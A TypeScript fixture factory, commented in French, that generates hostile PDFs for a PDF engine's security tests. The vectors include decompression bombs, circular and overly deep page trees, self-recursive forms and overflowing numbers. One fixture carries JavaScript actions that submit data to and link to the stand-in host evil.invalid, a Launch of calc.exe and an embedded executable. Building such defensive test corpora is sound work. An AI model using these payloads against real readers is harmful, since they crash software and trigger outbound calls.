// Les PDF hostiles du corpus (tests/fixtures/hostile-pdf), un par vecteur, et leur fabrique : chaque fichier commis se regenere
// d'ici (ACTUALISER_REFERENCES=1 npx vitest run tests/unit/securite/corpus-pdf.test.ts). Un vecteur nouveau, c'est une entree de
// HOSTILES ; sa ligne d'index.json se deduit d'elle (le test confronte les deux).

import { deflateSync } from 'node:zlib';
import { flux, octets, pdfClassique, pdfModerne, pdfUnePage } from '../engine/pdf/fabrique.js';

export interface Hostile {
  readonly fichier: string;
  readonly famille: string;
  readonly vecteur: string;
  readonly attendu: 'ouvre' | 'refus';
  /** Le debut du message de refus attendu, ou un texte des pertes dites a l'ouverture. */
  readonly dit?: string;
  readonly fabriquer: () => Buffer;
}

const CATALOGUE = '<< /Type /Catalog /Pages 2 0 R >>';
const ARBRE = '<< /Type /Pages /Kids [3 0 R] /Count 1 >>';
const PAGE = '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>';
const carre = flux('<< >>', '1 0 0 rg 10 10 20 20 re f');
const form = (contenu: string, dict = '') => flux('<< /Type /XObject /Subtype /Form /BBox [0 0 100 100] ' + dict + ' >>', contenu);

/** Un flux compresse ecrit tel quel (son /Length est celui des octets compresses). */
const fluxCompresse = (dict: string, brut: Buffer) => Buffer.concat([octets('<< ' + dict + ' /Filter /FlateDecode /Length ' + brut.length + ' >>\nstream\n'), brut, octets('\nendstream')]);

export const HOSTILES: readonly Hostile[] = [
  {
    fichier: 'bombe-decompression.pdf', famille: 'bombe', attendu: 'refus', dit: 'Ce PDF se décompresse en plus de 128 Mo',
    vecteur: 'Contenu de page FlateDecode de 130 Ko qui se decompresse en 129 Mo de zeros',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, PAGE, fluxCompresse('', deflateSync(Buffer.alloc(129 * 1024 * 1024), { level: 9 }))])
  },
  {
    fichier: 'bombe-flux-objets.pdf', famille: 'bombe', attendu: 'refus', dit: 'Ce PDF se décompresse en plus de 128 Mo',
    vecteur: 'Flux d objets (ObjStm) qui porte le catalogue et se decompresse en 129 Mo',
    fabriquer: () => pdfModerne([CATALOGUE, ARBRE, PAGE, carre], '/Root 1 0 R', 129 * 1024 * 1024)
  },
  {
    fichier: 'bombe-runlength.pdf', famille: 'bombe', attendu: 'refus', dit: 'Ce PDF se décompresse en plus de 128 Mo',
    vecteur: 'FlateDecode puis RunLengthDecode : 2 Ko qui font 2,1 Mo, puis 135 Mo (deux octets pour 128 repetitions)',
    fabriquer: () => {
      const brut = Buffer.alloc(2 * 1056 * 1024 + 1, 0);
      for (let i = 0; i + 1 < brut.length; i += 2) { brut[i] = 129; brut[i + 1] = 32; }
      brut[brut.length - 1] = 128;
      const z = deflateSync(brut, { level: 9 });
      return pdfClassique([CATALOGUE, ARBRE, PAGE, Buffer.concat([octets('<< /Filter [/FlateDecode /RunLengthDecode] /Length ' + z.length + ' >>\nstream\n'), z, octets('\nendstream')])]);
    }
  },
  {
    fichier: 'chiffre-rc4.pdf', famille: 'chiffrement', attendu: 'refus', dit: 'Ce PDF est chiffré',
    vecteur: 'Trailer /Encrypt (Standard, RC4 128 bits, mot de passe utilisateur vide)',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, PAGE, carre, '<< /Filter /Standard /V 2 /R 3 /Length 128 /O <00> /U <00> /P -4 >>'], '/Root 1 0 R /Encrypt 5 0 R')
  },
  {
    fichier: 'chiffre-filtre-crypt.pdf', famille: 'chiffrement', attendu: 'refus', dit: 'Ce PDF est chiffré',
    vecteur: 'Flux de contenu au filtre /Crypt sans dictionnaire de chiffrement',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, PAGE, '<< /Filter /Crypt /Length 4 >>\nstream\nabcd\nendstream'])
  },
  {
    fichier: 'prev-circulaire.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Chaine /Prev qui revient sur sa propre table (boucle infinie naive)',
    fabriquer: () => {
      const t = pdfClassique([CATALOGUE, ARBRE, PAGE, carre]).toString('latin1');
      const x = /startxref\s+(\d+)/.exec(t)?.[1] ?? '0';
      return Buffer.from(t.replace('/Root 1 0 R >>', '/Root 1 0 R /Prev ' + x + ' >>'), 'latin1');
    }
  },
  {
    fichier: 'xref-compte-demesure.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Section de table « 0 999999999 » pour cinq entrees (allocation naive)',
    fabriquer: () => Buffer.from(pdfClassique([CATALOGUE, ARBRE, PAGE, carre]).toString('latin1').replace(/xref\n0 5\n/, 'xref\n0 999999999\n'), 'latin1')
  },
  {
    fichier: 'xref-flux-largeurs.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Table en flux aux largeurs /W [9 9 9] et /Index demesure, reindexee par balayage',
    fabriquer: () => Buffer.from(pdfModerne([CATALOGUE, ARBRE, PAGE, carre]).toString('latin1').replace('/W [1 2 1]', '/W [9 9 9] /Index [0 2000000000]'), 'latin1')
  },
  {
    fichier: 'objstm-n-demesure.pdf', famille: 'structure', attendu: 'refus', dit: 'Ce PDF ne se lit pas',
    vecteur: 'Flux d objets qui annonce /N 1000000000 objets',
    fabriquer: () => Buffer.from(pdfModerne([CATALOGUE, ARBRE, PAGE, carre]).toString('latin1').replace(/\/N \d+ \/First/, '/N 1000000000 /First'), 'latin1')
  },
  {
    fichier: 'renvois-en-chaine.pdf', famille: 'structure', attendu: 'refus', dit: 'Ce PDF ne se lit pas',
    vecteur: 'Catalogue atteint par une chaine de 100 renvois (objet qui ne contient qu un renvoi)',
    fabriquer: () => {
      const objets: string[] = [CATALOGUE, ARBRE, PAGE, '<< /Length 0 >>\nstream\n\nendstream'];
      for (let k = 5; k < 105; k++) objets.push((k + 1) + ' 0 R');
      objets.push('1 0 R');
      return pdfClassique(objets, '/Root 5 0 R');
    }
  },
  {
    fichier: 'objet-auto-reference.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Objet qui vaut un renvoi a lui-meme, longueur de flux qui renvoie a son propre objet',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Rotate 5 0 R >>', '<< /Length 4 0 R >>\nstream\n0 0 1 rg 1 1 5 5 re f\nendstream', '5 0 R'])
  },
  {
    fichier: 'longueur-demesuree.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Flux a /Length 99999999999, lu jusqu a « endstream »',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, PAGE, '<< /Length 99999999999 >>\nstream\n1 0 0 rg 1 1 5 5 re f\nendstream'])
  },
  {
    fichier: 'fichier-tronque.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Fichier coupe au milieu de son contenu, sans table ni fin',
    fabriquer: () => { const t = pdfClassique([CATALOGUE, ARBRE, PAGE, flux('<< >>', '1 0 0 rg 1 1 5 5 re f 0 0 1 rg 10 10 5 5 re f')]); return t.subarray(0, t.toString('latin1').indexOf('0 0 1 rg 10')); }
  },
  {
    fichier: 'entete-decale.pdf', famille: 'structure', attendu: 'ouvre',
    vecteur: 'Huit cents octets de dechets avant « %PDF- » (tolere dans le premier kilo-octet)',
    fabriquer: () => Buffer.concat([Buffer.alloc(800, 0x41), pdfClassique([CATALOGUE, ARBRE, PAGE, carre])])
  },
  {
    fichier: 'pages-boucle.pdf', famille: 'arbre', attendu: 'refus', dit: 'Ce PDF ne se lit pas : un arbre de pages en boucle',
    vecteur: 'Arbre des pages dont un noeud est son propre enfant',
    fabriquer: () => pdfClassique([CATALOGUE, '<< /Type /Pages /Kids [3 0 R] /Count 1 >>', '<< /Type /Pages /Kids [2 0 R] /Count 1 >>'])
  },
  {
    fichier: 'pages-profondes.pdf', famille: 'arbre', attendu: 'refus', dit: 'Ce PDF a un arbre de pages trop profond',
    vecteur: 'Arbre des pages de 200 niveaux',
    fabriquer: () => {
      const o: string[] = [CATALOGUE];
      for (let k = 2; k < 202; k++) o.push('<< /Type /Pages /Kids [' + (k + 1) + ' 0 R] /Count 1 >>');
      o.push('<< /Type /Page /MediaBox [0 0 10 10] >>');
      return pdfClassique(o);
    }
  },
  {
    fichier: 'page-demesuree.pdf', famille: 'arbre', attendu: 'refus', dit: 'Cette page du PDF a une taille démesurée',
    vecteur: 'MediaBox de 10^12 points',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 1000000000000 100] /Contents 4 0 R >>', carre])
  },
  {
    fichier: 'formulaire-recursif.pdf', famille: 'formulaire', attendu: 'refus', dit: 'Ce PDF contient un formulaire qui se dessine lui-même',
    vecteur: 'XObject Form qui se dessine lui-meme (recursion infinie naive)',
    fabriquer: () => pdfUnePage('/F Do', { ressources: '/XObject << /F 5 0 R >>', autres: [form('0 0 1 1 re f /F Do', '/Resources << /XObject << /F 5 0 R >> >>')] })
  },
  {
    fichier: 'formulaires-croises.pdf', famille: 'formulaire', attendu: 'refus', dit: 'Ce PDF contient un formulaire qui se dessine lui-même',
    vecteur: 'Deux formulaires qui se dessinent l un l autre',
    fabriquer: () => pdfUnePage('/A Do', { ressources: '/XObject << /A 5 0 R >>', autres: [form('/B Do', '/Resources << /XObject << /B 6 0 R >> >>'), form('/A Do', '/Resources << /XObject << /A 5 0 R >> >>')] })
  },
  {
    fichier: 'formulaires-exponentiels.pdf', famille: 'formulaire', attendu: 'refus', dit: 'Ce PDF dessine plus de 20',
    vecteur: 'Dix niveaux de formulaires qui en dessinent chacun quatre (4^10 appels, une forme chacun)',
    fabriquer: () => {
      const autres: Buffer[] = [];
      for (let k = 0; k < 10; k++) autres.push(form(k === 9 ? '0 0 1 1 re f' : '/F Do /F Do /F Do /F Do', k === 9 ? '' : '/Resources << /XObject << /F ' + (6 + k) + ' 0 R >> >>'));
      return pdfUnePage('/F Do', { ressources: '/XObject << /F 5 0 R >>', autres });
    }
  },
  {
    fichier: 'pile-etats.pdf', famille: 'contenu', attendu: 'refus', dit: 'Ce PDF empile plus de 1024 états graphiques',
    vecteur: 'Cinq mille « q » sans « Q »',
    fabriquer: () => pdfUnePage('q '.repeat(5000) + '0 0 1 1 re f')
  },
  {
    fichier: 'imbrication-tableaux.pdf', famille: 'contenu', attendu: 'refus', dit: 'Ce PDF ne contient aucune page',
    vecteur: 'Dictionnaire de page imbrique sur 5 000 niveaux de tableaux',
    fabriquer: () => pdfClassique([CATALOGUE, '<< /Type /Pages /Kids [3 0 R] /Count 1 /X ' + '['.repeat(5000) + ']'.repeat(5000) + ' >>', PAGE, carre])
  },
  {
    fichier: 'coordonnees-demesurees.pdf', famille: 'contenu', attendu: 'refus', dit: 'Ce PDF a des coordonnées démesurées',
    vecteur: 'Matrice cm de facteur 10^30 : coordonnees au-dela du milliard, qui deborderaient en Infinity',
    fabriquer: () => pdfUnePage('1000000000000000 0 0 1000000000000000 0 0 cm 1000000000000000 0 0 1000000000000000 0 0 cm 0 0 1 1 re f')
  },
  {
    fichier: 'nombres-extremes.pdf', famille: 'contenu', attendu: 'ouvre',
    vecteur: 'Nombres de 400 chiffres, signes doubles, points seuls et matrice nulle',
    fabriquer: () => pdfUnePage('0 0 0 0 0 0 cm 1 1 m 2 2 l S Q q 1 0 0 1 0 0 cm --5 .5 m . - l 0.' + '0'.repeat(400) + '1 3 l S 1 0 0 rg 10 10 5 5 re f')
  },
  {
    fichier: 'image-en-ligne-sans-fin.pdf', famille: 'contenu', attendu: 'ouvre', dit: 'une partie illisible du contenu de la page',
    vecteur: 'Image en ligne BI … ID dont le EI manque',
    fabriquer: () => pdfUnePage('1 0 0 rg 0 0 5 5 re f BI /W 9 /H 9 /BPC 8 /CS /G ID ' + 'x'.repeat(100))
  },
  {
    fichier: 'operandes-sans-fin.pdf', famille: 'contenu', attendu: 'ouvre', dit: 'une partie illisible du contenu de la page',
    vecteur: 'Cinquante mille operandes sans operateur',
    fabriquer: () => pdfUnePage('1 0 0 rg 0 0 5 5 re f ' + '1 '.repeat(50_000))
  },
  {
    fichier: 'filtre-lzw.pdf', famille: 'filtre', attendu: 'refus', dit: 'Ce PDF emploie la compression LZW',
    vecteur: 'Contenu de page en LZWDecode, non pris en charge',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, PAGE, '<< /Filter /LZWDecode /Length 4 >>\nstream\n\x80\x0b\x60\x50\nendstream'])
  },
  {
    fichier: 'filtre-inconnu.pdf', famille: 'filtre', attendu: 'refus', dit: 'Ce PDF emploie un filtre inconnu',
    vecteur: 'Filtre au nom inconnu, et chaine de neuf filtres',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, PAGE, '<< /Filter /JavaScriptDecode /Length 4 >>\nstream\nabcd\nendstream'])
  },
  {
    fichier: 'predicteur-demesure.pdf', famille: 'filtre', attendu: 'ouvre', dit: 'une partie illisible du contenu de la page',
    vecteur: 'Predicteur PNG a 10^9 colonnes sur un flux de contenu',
    fabriquer: () => pdfClassique([CATALOGUE, ARBRE, '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents [4 0 R 5 0 R] >>', fluxCompresse('/DecodeParms << /Predictor 12 /Columns 1000000000 >>', deflateSync(Buffer.from('xyz'))), carre])
  },
  {
    fichier: 'fonction-postscript-profonde.pdf', famille: 'fonction', attendu: 'ouvre', dit: 'les tons directs et couleurs Lab, approchés en RVB',
    vecteur: 'Ton direct a fonction PostScript imbriquee sur 2 000 niveaux, et pile qui deborde',
    fabriquer: () => pdfUnePage('/S cs 1 sc 0 0 5 5 re f /T cs 1 sc 6 6 5 5 re f', {
      ressources: '/ColorSpace << /S [/Separation /A /DeviceRGB 5 0 R] /T [/Separation /B /DeviceRGB 6 0 R] >>',
      autres: [flux('<< /FunctionType 4 /Domain [0 1] /Range [0 1 0 1 0 1] >>', '{ ' + '{ '.repeat(2000) + '}'.repeat(2000) + ' }'), flux('<< /FunctionType 4 /Domain [0 1] /Range [0 1 0 1 0 1] >>', '{ ' + 'dup '.repeat(5000) + '}')]
    })
  },
  {
    fichier: 'espaces-couleur-circulaires.pdf', famille: 'couleur', attendu: 'ouvre',
    vecteur: 'Espaces de couleur nommes qui se renvoient l un a l autre, Indexed a table vide et indice demesure',
    fabriquer: () => pdfUnePage('/A cs 1 sc 0 0 5 5 re f /I cs 999999 sc 6 6 5 5 re f', { ressources: '/ColorSpace << /A /B /B /A /I [/Indexed /DeviceRGB 255 <>] >>' })
  },
  {
    fichier: 'actions-javascript.pdf', famille: 'actif', attendu: 'ouvre',
    vecteur: 'OpenAction JavaScript, actions de page, liens Launch et URI, fichier joint, formulaire XFA : rien ne s execute ni ne sort',
    fabriquer: () => pdfClassique([
      '<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >> /AA << /WC << /S /JavaScript /JS (this.submitForm\\("https://evil.invalid"\\)) >> >> /Names << /EmbeddedFiles << /Names [(x.exe) << /Type /Filespec /F (x.exe) >>] >> >> /AcroForm << /XFA (<xdp/>) >> >>',
      ARBRE,
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /AA << /O << /S /Launch /F (calc.exe) >> >> /Annots [<< /Subtype /Link /Rect [0 0 10 10] /A << /S /URI /URI (https://evil.invalid/pixel) >> >>] >>',
      carre
    ])
  },
  {
    fichier: 'calques-bizarres.pdf', famille: 'calque', attendu: 'ouvre',
    vecteur: 'Proprietes de calque circulaires, OCMD sans OCG, EMC orphelins et BDC jamais fermes',
    fabriquer: () => pdfClassique([
      '<< /Type /Catalog /Pages 2 0 R /OCProperties << /OCGs 5 0 R /D << /OFF 5 0 R /BaseState /OFF /ON [6 0 R] >> >> >>', ARBRE,
      '<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R /Resources << /Properties << /P 6 0 R /Q << /Type /OCMD >> >> >> >>',
      flux('<< >>', 'EMC EMC /OC /P BDC 1 0 0 rg 0 0 5 5 re f /OC /Q BDC 6 6 5 5 re f /OC /Z BDC'), '[5 0 R]', '<< /Type /OCG /Name (P) /Intent 6 0 R >>'
    ])
  },
  {
    fichier: 'chaine-geante.pdf', famille: 'contenu', attendu: 'ouvre', dit: '1 texte',
    vecteur: 'Chaine de texte de 300 Ko a cent mille parentheses imbriquees',
    fabriquer: () => pdfUnePage('1 0 0 rg 0 0 5 5 re f BT (' + 'a('.repeat(100_000) + ')'.repeat(100_000) + ') Tj ET')
  }
];
